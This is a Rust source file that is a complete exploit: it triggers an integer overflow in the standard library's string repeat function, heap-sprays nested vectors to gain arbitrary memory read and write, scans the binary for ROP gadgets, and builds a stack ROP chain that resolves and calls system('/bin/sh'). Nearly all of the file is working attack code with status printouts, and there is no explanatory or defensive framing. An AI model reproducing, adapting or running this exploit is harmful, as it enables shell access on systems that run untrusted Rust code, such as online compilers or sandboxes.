use std::{thread, time};
use std::sync::mpsc::channel;

extern {
    fn dlsym(handle: *const u8, symbol: *const u8) -> *const u8;
}

static ERROR_VALUE      : u64           = 0xffffffffffffffff;

static VECTOR_SIZE      : usize         = 0x600000;
static VECTOR_SPRAY_CNT : usize         = 10000;

static BIN_SH_STR       : u64           = 0x7f007f7f0000 + 0x200;
static SYSTEM           : u64           = 0x7f007f7f0000 + 0x220;
static POP_RDI_JMP_RAX  : u64           = 0xe0ff5f;
static POP_RDI_RET      : u64           = 0xc35f;
static POP_RSI_RET      : u64           = 0xc35e;

fn get_stack_addr() -> u64 {
    let local_var = String::new();
    let stack_addr = &format!("{:p}", &local_var)[2..]; 
    return u64::from_str_radix(&stack_addr, 0x10).unwrap();
}

fn scan_for_value(allocs : &mut Vec<Vec<Vec<u64>>>, corrupted_vec : usize, 
                                                        target_vec : usize, target_idx : usize,
                                                        addr : u64, bytes : u64, mask : u64) -> u64 {
    for i in 0..0x1000000 {
        let mut val = do_relative_read(allocs, corrupted_vec, target_vec, target_idx, addr, i);
        for j in 0..8 {
            val = val >> (8 * (j as u64));
            if (val & mask) == bytes {
                return (i*8 + j) as u64;
            }
        }
    }

    return ERROR_VALUE;
}

fn scan_for_qword(allocs : &mut Vec<Vec<Vec<u64>>>, corrupted_vec : usize, 
                                                        target_vec : usize, target_idx : usize,
                                                        addr : u64, qword : u64) -> u64 {
    for i in 0..0x1000000 {
        let mut val = do_relative_read(allocs, corrupted_vec, target_vec, target_idx, addr, i);
        if (val & 0xffffffffffff0000) == ( qword & 0xffffffffffff0000) {
            if val > qword {
                return (i*8) as u64;
            }
        }
    }

    return ERROR_VALUE;
}

fn do_relative_read(allocs : &mut Vec<Vec<Vec<u64>>>, corrupted_vec : usize, 
                                                        target_vec : usize, target_idx : usize,
                                                        addr : u64, offset : usize) -> u64 {
    allocs[corrupted_vec][0][target_vec] = addr;
    return allocs[target_idx][0][offset];

}

fn do_arbitrary_write(allocs : &mut Vec<Vec<Vec<u64>>>, corrupted_vec : usize, 
                                                        target_vec : usize, target_idx : usize,
                                                        addr : u64, value : u64) {
    allocs[corrupted_vec][0][target_vec] = addr;
    allocs[target_idx][0][0] = value;
}

fn corrupt_with_rop(allocs : &mut Vec<Vec<Vec<u64>>>, corrupted_vec : usize, 
                                                      target_vec : usize,
                                                      target_idx : usize) {
    let stack_addr = get_stack_addr();
    let main_addr = main as u64;
    let dlsym_addr = dlsym as u64;

    println!("[*corrupt*]\tresolve gadgets");
    let pop_rdi_ret_off = scan_for_value(allocs, corrupted_vec, target_vec, target_idx, main_addr, POP_RDI_RET, 0xffff) + 1;
    let pop_rsi_ret_off = scan_for_value(allocs, corrupted_vec, target_vec, target_idx, main_addr, POP_RSI_RET, 0xffff);
    let pop_rdi_jmp_rax_off = scan_for_value(allocs, corrupted_vec, target_vec, target_idx, main_addr, POP_RDI_JMP_RAX, 0xffffff);
    let ret_addr_off = scan_for_qword(allocs, corrupted_vec, target_vec, target_idx, stack_addr+0x450, exploit_thread as u64);

    let ret_addr = stack_addr + 0x450 + ret_addr_off;
    if pop_rdi_ret_off == ERROR_VALUE || pop_rsi_ret_off == ERROR_VALUE || pop_rdi_jmp_rax_off == ERROR_VALUE {
        println!("[*corrupt*] failed to resolve gadgets, abort");
        return;
    }

    println!("[*corrupt*]\tstack addr @ {:#x}, ret_addr @ {:#x}", stack_addr, ret_addr);

    // set up the strings I need
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, BIN_SH_STR, 0x0068732f6e69622f);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, SYSTEM, 0x006d6574737973);

    // build the ROP on the stack
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*0, main_addr + pop_rdi_ret_off + 1); // make stack aligned for movaps
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*1, main_addr + pop_rdi_ret_off);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*2, 0);    // handle = NULL;
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*3, main_addr + pop_rsi_ret_off);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*4, SYSTEM);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*5, dlsym_addr);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*6, main_addr + pop_rdi_jmp_rax_off);
    do_arbitrary_write(allocs, corrupted_vec, target_vec, target_idx, ret_addr+0x8*7, BIN_SH_STR);
    println!("[*corrupt*]\ttrigger retq");
}

fn spray_vectors(size : usize, count: usize) -> Vec<Vec<Vec<u64>>>  {
    let mut allocs = Vec::new();
    for _i in 0..count {
        let mut vec : Vec<Vec<u64>> = Vec::with_capacity(size);
        let mut subvec : Vec<u64> = Vec::with_capacity(size);
        subvec.push(0x43434343);
        vec.push(subvec);
        allocs.push(vec);
    }
    return allocs;
}

/*
    terminology:
        corrupted_vec:  the first vector I find that was corrupted with the wildcopy
        target_vec:     the vector I find while relative read scan the memory, and corrupt it for arbitrary use
        target_idx:     the actual index of the target_vec, so I can do allocs[idx][0][0] for arbitrary RW
*/
fn exploit_thread(size : usize, count: usize, tx : std::sync::mpsc::Sender<()>) {
    println!("[*shape*]\tshape: spraying vectors");
    let mut allocs = spray_vectors(size, count);
    println!("[*shape*]\tshape: done spraying vectors");

    tx.send(()).unwrap();

    thread::sleep(time::Duration::from_millis(1000));
    let mut corrupted_vec = 0;
    println!("[*scan*]\tstart checking vectors");
    for i in 0..count {
        if allocs[i][0].len() > 1 {
            println!("[*scan*]\tvec corrupted! allocs[{}][0].len() == {:#x}", i, allocs[i][0].len());
            corrupted_vec = i;
            break;
        }
    }

    if corrupted_vec == 0 {
        println!("[*scan*]\tfailed to find target vec, abort");
        return;
    }

    println!("[*scan*]\tdone checking vectors");

    // find target vector
    let mut target_vec : usize = 0x0;
    println!("[*scan*]\tstart scan for interesting data");
    for i in 0..0x100000000 {
        if allocs[corrupted_vec][0][i] != 0 {
            let val = allocs[corrupted_vec][0][i];
            println!("[*scan*]\tfound interesting data at offset {}*8 == {:#x}", i, val);
            if val > 0x7f0000000000 {
                target_vec = i;
                println!("[*scan*]\tfound vector buf pointer at {} == {:#x}", target_vec, val);

                // mark the second corrupted vector, so I can find it easily for later use
                allocs[corrupted_vec][0][i+2] = 0x4848484848484848 as u64;
                break;
            }
        }
    }

    let mut target_idx = 0x0;
    for i in 0..count {
        if allocs[i][0].len() == 0x4848484848484848 {
            target_idx = i;
        }
    }
    if target_idx == 0 {
        println!("[*scan*]\tfailed to find second target vec, abort");
        return;
    }

    /*
        when exploit_thread exists, it frees the allocs vector and
        cleanup lots of the pointers and stuctures. We clearly segfualt there,
        so why not simply pass our RW structure into a subfunctio, and execute
        ROP on its return :)
    */
    println!("[*corrupt*]\tcorrupt ret addr with ROP");
    corrupt_with_rop(&mut allocs, corrupted_vec, target_vec, target_idx);
}

fn trigger_vulnerability(size : usize) {
    println!("[*vuln*]\ttrigger_vulnerability");
    let fixed_addr = "\x00\x00\x7f\x7f\x00\x7f\x00\x00";
    let _s = fixed_addr.repeat(0x4000000000000000 + size / 8);
}

fn main() {
    let (tx, rx) = channel();
    println!("[*start*]\tLet the fun begin!");

    thread::spawn(move || { exploit_thread(VECTOR_SIZE, VECTOR_SPRAY_CNT, tx)});
    
    rx.recv().unwrap();
    thread::sleep(time::Duration::from_millis(100));
    trigger_vulnerability(VECTOR_SIZE);

    thread::sleep(time::Duration::from_millis(1000 * 60));
}
